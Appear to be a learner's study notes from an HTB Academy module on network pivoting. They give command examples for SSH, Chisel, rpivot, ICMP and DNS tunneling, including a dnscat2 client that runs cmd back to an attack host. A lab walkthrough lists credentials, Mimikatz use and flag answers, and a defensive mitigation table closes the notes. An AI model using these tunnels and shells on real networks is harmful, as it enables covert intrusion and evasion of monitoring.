# Pivoting, Tunneling & Port Forwarding – Complete Module Documentation

This document summarizes everything learned in the HTB Academy module. It covers definitions, core concepts, tools, step-by-step commands, and detection/prevention strategies.

---

## 📌 Core Definitions

| Term | Description |
|------|-------------|
| **Pivoting** | Using a compromised host to access networks that are not directly reachable from your attack machine. |
| **Tunneling** | Encapsulating traffic inside another protocol (e.g., SSH, DNS, ICMP) to bypass firewalls and avoid detection. |
| **Port Forwarding** | Redirecting communication from one port to another, often through a pivot host. |
| **Lateral Movement** | Moving between hosts on the **same** network level, typically to escalate privileges or gather credentials. |

> **Key difference:** Lateral movement = spreading **wide**; pivoting = going **deep** into other network segments.

---

## 🌐 Networking Essentials

- **NICs & IPs**: A host with multiple network interfaces (e.g., `eth0` and `eth1`) can bridge networks.
- **Routing Table** (`netstat -r` / `ip route`): Shows which networks are reachable and via which gateway.
- **Subnet Masks**: Define the network and host portions of an IP.
- **Default Gateway**: The router used for traffic destined outside the local subnet.

Always check for additional interfaces on a compromised host – they are your clue to pivot.

---

## 🔧 SSH Tunneling (Linux)

### Local Port Forward (`-L`)
Forward a local port to a remote service.
```bash
ssh -L 1234:localhost:3306 user@pivot
# Now connect to localhost:1234 to reach the remote MySQL
```

### Dynamic Port Forward (`-D`) – SOCKS Proxy
Create a SOCKS proxy that can be used with any tool via proxychains.
```bash
ssh -D 9050 user@pivot
# Edit /etc/proxychains.conf: socks4 127.0.0.1 9050
proxychains nmap -sT -Pn 172.16.5.19
```

### Remote Port Forward (`-R`)
Forward a port on the pivot back to your attack host.
```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 user@pivot -vN
# Pivot listens on 8080; traffic forwarded to your listener on 8000
```

### SSH for Windows – Plink
Windows equivalent of ssh.
```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```
Use Proxifier (Windows) to tunnel all applications through the SOCKS proxy.

---

## 🧰 Chisel – HTTP/SSH Tunneling
Single binary (Go) – easy to transfer. Uses HTTP + SSH.

### Standard (Pivot as server)
```bash
# On pivot
./chisel server -v -p 1234 --socks5

# On attack host
./chisel client -v 10.129.202.64:1234 socks
# SOCKS5 proxy on 127.0.0.1:1080
```

### Reverse mode (Pivot can't accept inbound)
```bash
# On attack host
sudo ./chisel server --reverse -v -p 1234 --socks5

# On pivot
./chisel client -v 10.10.14.17:1234 R:socks
```

---

## 🐍 Rpivot – Reverse SOCKS Proxy
Python2 tool; client connects out to the server (useful when pivot is behind NAT/firewall).
```bash
# Attack host
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Pivot (after transferring rpivot folder)
python2 client.py --server-ip <attack_IP> --server-port 9999
```
Now use proxychains with 127.0.0.1:9050 to reach internal networks.

Supports NTLM authentication for corporate proxies.

---

## 🖥️ SocksOverRDP (Windows only)
Leverages RDP Dynamic Virtual Channels to tunnel SOCKS traffic inside an RDP session.

**Process:**
1. On the foothold Windows host, register the plugin:
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```
2. RDP to an internal host (e.g., 172.16.5.19 as victor).
3. On that internal host, run `SocksOverRDP-Server.exe` (as Admin).
4. On the foothold, a SOCKS5 listener starts on `127.0.0.1:1080`.
5. Use Proxifier to force any application (e.g., mstsc.exe) through this proxy.
6. RDP deeper into the network.

Requires Visual C++ Redistributable if regsvr32 fails.

---

## 🧊 ICMP Tunneling with ptunnel-ng
Encapsulates TCP traffic in ICMP echo packets – stealthy because ping is often allowed.
```bash
# Build static binary (avoid GLIBC issues)
cd ptunnel-ng
sed -i '$s/.*/LDFLAGS=-static .../' autogen.sh
./autogen.sh

# On pivot (server)
sudo ./ptunnel-ng -r10.129.202.64 -R22

# On attack host (client)
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# SSH through the tunnel
ssh -p2222 -lubuntu 127.0.0.1

# Or create a SOCKS proxy
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

---

## 🌐 DNS Tunneling with dnscat2
Hides traffic inside DNS queries (TXT records) – works even when other egress is blocked.

**Setup (attack host):**
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=inlanefreight.local --no-cache
# Note the secret key
```

**Windows client (PowerShell):**
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <attack_IP> -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd
```

**Interact:**
```bash
dnscat2> window -i 1
```

---

## 🔩 Windows Native – Netsh Port Forward
Forward a local port on a Windows pivot to an internal host.
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.25
netsh interface portproxy show v4tov4
```
Then RDP to `pivot_IP:8080`.

---

## 🔌 Other Tools

**Sshuttle** – VPN-like tunneling over SSH; no proxychains needed.
```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

**Socat** – bidirectional relay; can be used for bind/reverse shells without SSH.
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

---

## 🧠 Skills Assessment Workflow (Example)

1. Web shell → enumerate home directories → find webadmin's private key and credentials `mlefay:Plain Human work!`.
2. Ping sweep → discover internal host `172.16.5.35`.
3. SSH with key (or Chisel) to pivot → find RDP open.
4. RDP as `mlefay` → grab flag `S1ng13-Piv07-3@sy-Day`.
5. Mimikatz on that host → dump credentials → find user `vfrank`.
6. Ping sweep on `172.16.6.0/24` → find `172.16.6.25`.
7. RDP as `vfrank` (or using discovered creds) → grab flag `N3tw0rk-H0pp1ng-f0R-FuN`.
8. RDP to Domain Controller (`172.16.6.45`) → final flag.

---

## 🛡️ Detection & Prevention

| Attack Technique | Defensive Measure |
|---|---|
| External remote services (T1133) | Firewalls, VPNs, block internal protocol egress |
| Remote services (T1021) | MFA, limit accounts, network segmentation, OOB management |
| Non-standard ports (T1571) | Baselines, NIPS/NIDS to detect anomalies |
| Protocol tunneling (T1572) | Lock down allowed ports/protocols, monitor DNS/beaconing |
| Proxy use (T1090) | Allow/block lists, monitor net flow |
| Living off the land (LOTL) | EDR/AV, baselines, SIEM correlation |

**Key:**
- Document all assets, users, and network diagrams.
- Implement MFA, strict access controls, and proper segmentation.
- Monitor for unusual traffic patterns and beaconing.

---

## 🔗 Next Steps & Resources

- **HTB Labs:** Enterprise, Inception, Reddish
- **Pro Labs:** Dante, Offshore, RastaLabs, Ascension
- **Blogs:** 0xdf, RastaMouse, SpecterOps, HTB Blog, SANS
- **Modules:** Introduction to Networking, Active Directory, Shells & Payloads, Web Applications

---

## 🏁 Closing

This module covered the essential skills for moving through networks after an initial compromise. Pivoting, tunneling, and port forwarding are core to any penetration test. Practice on HTB machines and Pro Labs to master these techniques.

Happy Hacking! 🚀
